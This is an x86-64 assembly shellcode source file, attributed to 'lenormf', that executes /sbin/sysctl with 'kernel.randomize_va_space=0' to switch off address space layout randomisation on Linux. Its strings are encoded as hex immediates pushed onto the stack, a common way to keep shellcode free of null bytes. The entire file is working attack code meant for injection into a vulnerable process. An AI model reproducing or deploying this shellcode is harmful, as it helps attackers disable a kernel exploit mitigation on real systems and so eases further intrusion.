;;
;; off_aslr_sysctl.S for shellcodes
;; by lenormf
;;

bits 64

global _start

_start:
	;; execve("/sbin/sysctl", ["/sbin/sysctl", "kernel.randomize_va_space=0", 0], 0)
	xor rdx, rdx

	push DWORD 0x01303d65
	mov BYTE [rsp + 3], dl
	mov rsi, 0x636170735f61765f
	push rsi
	mov rsi, 0x657a696d6f646e61
	push rsi
	mov rsi, 0x722e6c656e72656b
	push rsi

	mov rcx, rsp

	push DWORD 0x6c746373
	mov rdi, 0x79732f6e6962732f
	push rdi
	mov rdi, rsp

	push rdx
	push rcx
	push rdi
	mov rsi, rsp

	xor rax, rax
	mov al, 59
	syscall
